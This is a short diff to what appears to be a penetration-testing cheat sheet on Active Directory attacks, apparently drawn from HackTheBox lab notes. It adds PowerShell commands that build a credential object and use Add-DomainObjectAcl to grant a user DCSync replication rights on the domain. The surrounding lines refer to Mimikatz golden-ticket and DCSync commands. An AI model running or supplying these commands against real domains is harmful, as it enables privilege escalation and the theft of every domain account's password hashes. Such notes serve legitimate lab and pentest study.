@@ -19,6 +19,14 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainN
 
 ### DCsync Attack
 
+DCSync Privileges:
+
+```text
+$SecPassword = ConvertTo-SecureString 'username123$!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\username', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity username -Rights DCSync
+```
+
 DCsync using mimikatz \(You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges\):
 
 ```text
